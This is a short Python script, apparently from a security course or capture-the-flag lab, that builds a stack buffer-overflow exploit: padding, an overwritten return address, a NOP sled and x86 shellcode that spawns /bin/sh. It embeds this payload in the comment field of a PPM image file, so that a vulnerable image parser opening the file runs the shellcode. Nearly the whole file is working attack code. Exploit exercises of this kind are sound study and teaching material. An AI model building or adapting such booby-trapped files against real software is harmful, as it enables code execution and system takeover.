from pwn import p32
import sys


# Update the following two variables with the correct values
buffer_start = 0xffffd05b
buffer_offset = 109

# these dont need to be changed
word_size = 4
nop_sled_size = 15

# /bin/sh
shellcode = b"\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

buffer_bytes = b'\x90' * (buffer_offset - 1)
ebp_bytes = b'\x90' * word_size
#return_address = p32(buffer_start + buffer_offset + (2 * word_size))
return_address = p32(0xffffd116)

nop_sled = b'\x90' * nop_sled_size

payload = buffer_bytes + ebp_bytes + return_address + nop_sled + shellcode

# need to create a ppm image file that contains this payload as a comment
with open("payload.ppm", "wb") as f:
    f.write(b"P6\n")
    f.write(b"3 2\n")
    f.write(b"255\n")
    f.write(b"# " + payload + b"\n")
    f.write(b"\x00\x00\x00\x00\x00\x00")
    f.write(b"\x00\x00\x00\x00\x00\x00")

print()
# print the words of the payload, in hex. 2 words per line
for i in range(0, len(payload), 8):
    print(f"0x{payload[i:i+4].hex()} 0x{payload[i+4:i+8].hex()}")
